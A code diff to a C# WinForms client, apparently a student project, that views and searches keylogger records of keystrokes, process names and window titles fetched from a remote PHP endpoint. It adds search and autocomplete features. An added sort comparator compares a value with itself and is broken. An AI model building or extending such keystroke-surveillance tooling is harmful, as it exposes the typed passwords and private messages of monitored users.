@@ -19,6 +19,10 @@ namespace IdpaClient
         private const string LOG_PATH = @"C:\Temp\log.xml";
         private const string URI_GET_PCINFO = @"http://www.swordbreacker.ch/idpa/getdata.php";
         private Logger logger;
+        private AutoCompleteStringCollection textSource = new AutoCompleteStringCollection();
+        private AutoCompleteStringCollection dateSource = new AutoCompleteStringCollection();
+        private AutoCompleteStringCollection wNameSource = new AutoCompleteStringCollection();
+        private AutoCompleteStringCollection aNameSource = new AutoCompleteStringCollection();
 
         private PcInfromations pcInformations = new PcInfromations();
 
@@ -41,6 +45,9 @@ namespace IdpaClient
 
             foreach (ApplicationLog app in logger.applicationLog)
             {
+                if (app.date == null || app.processName == null || app.windowName == null)
+                    continue;
+
                 string[] rowData = new string[4];
 
                 string keyString = "";
@@ -52,6 +59,15 @@ namespace IdpaClient
 
                 keyString = ReplaceKeyStrings(keyString);
 
+                if (!aNameSource.Contains(app.processName))
+                    aNameSource.Add(app.processName);
+                if (!wNameSource.Contains(app.windowName))
+                    wNameSource.Add(app.windowName);
+                if (!dateSource.Contains(app.date.ToString()))
+                    dateSource.Add(app.date.ToString());
+                if (!textSource.Contains(keyString))
+                    textSource.Add(keyString);
+
                 rowData[0] = app.date.ToString();
                 rowData[1] = app.processName;
                 rowData[2] = app.windowName;
@@ -59,11 +75,13 @@ namespace IdpaClient
 
                 keyLoggerDataView.Rows.Add(rowData);
             }
+
+            searchBox.AutoCompleteCustomSource = textSource;
         }
 
         private void getData_Click(object sender, EventArgs e)
         {
-            eventLog.Text += "Starting download... \r\n";
+            print("Starting download...");
             ConnectionManager.SendCommand("127.0.0.1", "ping");
             eventLog.AppendText("Ping: " + Program.stopwatch.Elapsed.Milliseconds + "\r\n");
             Program.stopwatch.Reset();
@@ -114,21 +132,164 @@ namespace IdpaClient
 
         private void search_Click(object sender, EventArgs e)
         {
-            eventLog.Text += "Starting search of '" + searchBox.Text + "'... \r\n";
-            eventLog.Text += "Search finished \r\n";
+            Search();
+        }
+
+        private void searchBox_OnKeyDown(object sender, KeyEventArgs e)
+        {
+            if (e.KeyData == Keys.Return)
+                Search();
         }
 
         private void adressinformation_SelectedIndexChanged(object sender, EventArgs e)
         {
-
+            
         }
 
-        private void searchBox_TextChanged(object sender, EventArgs e)
+        private void Search()
         {
-            foreach (DataGridViewRowCollection rowCollection in keyLoggerDataView.Rows)
+            print("Starting search of '" + searchBox.Text + "'...");
+
+            if (searchBox.Text == "")
             {
-                
+                GetKeyLoggerData();
+                return;
             }
+
+            if(radioAName.Checked)
+                SearchApplicationName();
+            else if(radioDate.Checked)
+                SearchDate();
+            else if (radioWName.Checked)
+                SearchWindowName();
+            else
+                SearchText();
+
+            print("Search finished");
+        }
+
+        private void UpdateRows(int[] indexArray)
+        {
+            keyLoggerDataView.Rows.Clear();
+
+            foreach(int i in indexArray)
+            {
+                ApplicationLog app = logger.applicationLog[i];
+
+                if (app.date == null || app.processName == null || app.windowName == null)
+                    continue;
+
+                string[] rowData = new string[4];
+                string keyString = "";
+                
+                foreach (string key in app.keyList)
+                {
+                    keyString += key;
+                }
+
+                keyString = ReplaceKeyStrings(keyString);
+
+                rowData[0] = app.date.ToString();
+                rowData[1] = app.processName;
+                rowData[2] = app.windowName;
+                rowData[3] = keyString;
+
+                keyLoggerDataView.Rows.Add(rowData);
+            }
+        }
+
+        private void SearchText()
+        {
+            List<int> appIndexes = new List<int>();
+
+            for (int i = 0; i < logger.applicationLog.Count; i++ )
+            {
+                ApplicationLog app = logger.applicationLog[i];
+
+                string keyString = "";
+
+                foreach (string key in app.keyList)
+                {
+                    keyString += key;
+                }
+
+                keyString = ReplaceKeyStrings(keyString);
+
+                if (keyString.ToLower().Contains(searchBox.Text.ToLower()))
+                {
+                    appIndexes.Add(i);
+                }
+            }
+            UpdateRows(appIndexes.ToArray());
+        }
+
+        private void SearchApplicationName()
+        {
+            List<int> appIndexes = new List<int>();
+
+            for (int i = 0; i < logger.applicationLog.Count; i++)
+            {
+                ApplicationLog app = logger.applicationLog[i];
+                if (app.processName == null)
+                    continue;
+
+                if (app.processName.ToLower().Contains(searchBox.Text.ToLower()))
+                {
+                    appIndexes.Add(i);
+                }
+            }
+            UpdateRows(appIndexes.ToArray());
+        }
+
+        private void SearchWindowName()
+        {
+            List<int> appIndexes = new List<int>();
+
+            for (int i = 0; i < logger.applicationLog.Count; i++)
+            {
+                ApplicationLog app = logger.applicationLog[i];
+                if (app.windowName == null)
+                    continue;
+
+                if (app.windowName.ToLower().Contains(searchBox.Text.ToLower()))
+                {
+                    appIndexes.Add(i);
+                }
+            }
+            UpdateRows(appIndexes.ToArray());
+        }
+
+        private void SearchDate()
+        {
+            List<int> appIndexes = new List<int>();
+
+            for (int i = 0; i < logger.applicationLog.Count; i++)
+            {
+                ApplicationLog app = logger.applicationLog[i];
+                if (app.date == null)
+                    continue;
+
+                if (app.date.ToString().ToLower().Contains(searchBox.Text.ToLower()))
+                {
+                    appIndexes.Add(i);
+                }
+            }
+            UpdateRows(appIndexes.ToArray());
+        }
+
+        private List<string> SortByHasCode(List<string> stringToSort)
+        {
+            stringToSort.Sort(CompareByHasCode);
+            return stringToSort;
+        }
+
+        private int CompareByHasCode(string x, string y)
+        {
+            if (x.GetHashCode() > x.GetHashCode())
+                return 1;
+            if (x.GetHashCode() < x.GetHashCode())
+                return -1;
+            else return 0;
         }
 
         private string ReplaceKeyStrings(string text)
@@ -210,6 +371,58 @@ namespace IdpaClient
             return text;
         }
 
+        private void radioText_CheckedChanged(object sender, EventArgs e)
+        {
+            searchBox.AutoCompleteCustomSource = textSource;
+        }
+
+        private void radioAName_CheckedChanged(object sender, EventArgs e)
+        {
+            searchBox.AutoCompleteCustomSource = aNameSource;
+        }
+
+        private void radioWName_CheckedChanged(object sender, EventArgs e)
+        {
+            searchBox.AutoCompleteCustomSource = wNameSource;
+        }
+
+        private void radioDate_CheckedChanged(object sender, EventArgs e)
+        {
+            searchBox.AutoCompleteCustomSource = dateSource;
+        }
+
+        private void print(string msg)
+        {
+            eventLog.AppendText(msg + "\r\n");
+        }
+
+        //public static int BinSearch(ref int[] x, int searchValue)
+        //{
+        //    //Gibt den Index von SearchValue sortiert zurück
+        //    //Gibt -1 zurück wenn searchValue nicht gefunden wird
+        //    int left = 0;
+        //    int right = x.Length;
+        //    return binarySearch(ref x, searchValue, left, right);
+        //}
+
+        //private static int binarySearch(ref int[] x, int searchValue, int left, int right)
+        //{
+        //    //Wenn allle Elemente durchsucht wurden dann gibt -1 zurück
+        //    if (right < left)
+        //        return -1;
+
+        //    //Ermittle die Mitte des Suchbereiches
+        //    int mid = (left + right) >> 1;
+        //    //Wenn der Suchwert grösser ist als dieser Eintrag machen eine Weitere suche mit dem Bereich: Mitte + 1 und Left
+        //    if (searchValue > x[mid])
+        //        return binarySearch(ref x, searchValue, mid + 1, right);
+        //    //Wenn der Suchwert kleiner ist als dieser Eintrag mache eine Weitere suche mit dem Bereich: right und Mitte -1
+        //    else if (searchValue < x[mid])
+        //        return binarySearch(ref x, searchValue, left, mid - 1);
+        //    //Wenn der Wert nicht kleiner oder grösser ist wurde der gesuchte Wert gefunden er wird ausgegeben
+        //    else
+        //        return mid;
+        //}
     }
 }
 
